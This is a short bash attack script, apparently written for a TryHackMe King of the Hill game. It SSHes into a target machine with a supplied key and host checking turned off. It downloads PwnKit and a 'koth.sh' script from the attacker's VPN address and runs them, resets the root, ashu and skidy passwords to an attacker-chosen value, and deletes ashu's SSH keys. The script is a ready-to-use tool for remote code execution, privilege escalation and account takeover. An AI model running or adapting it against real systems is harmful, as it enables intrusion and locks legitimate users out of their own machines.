#!/bin/bash


read -p "Your TryHackMe username: " nick
read -p "Enter the machine IP address: " ip_address
read -p "Enter please the id_rsa Path: " id_rsa_path
read -s -p "Enter the new password: " password

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

ssh -o StrictHostKeychecking=no -i "$id_rsa_path" ashu@"$ip_address" << EOF

    cd /tmp && wget http://$vpn/PwnKit && chmod +x PwnKit && ./PwnKit
    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick"
    echo "root:$password" | chpasswd
    echo "ashu:$password" | chpasswd
    echo "skidy:$password" | chpasswd
    rm -rf /home/ashu/.ssh
EOF
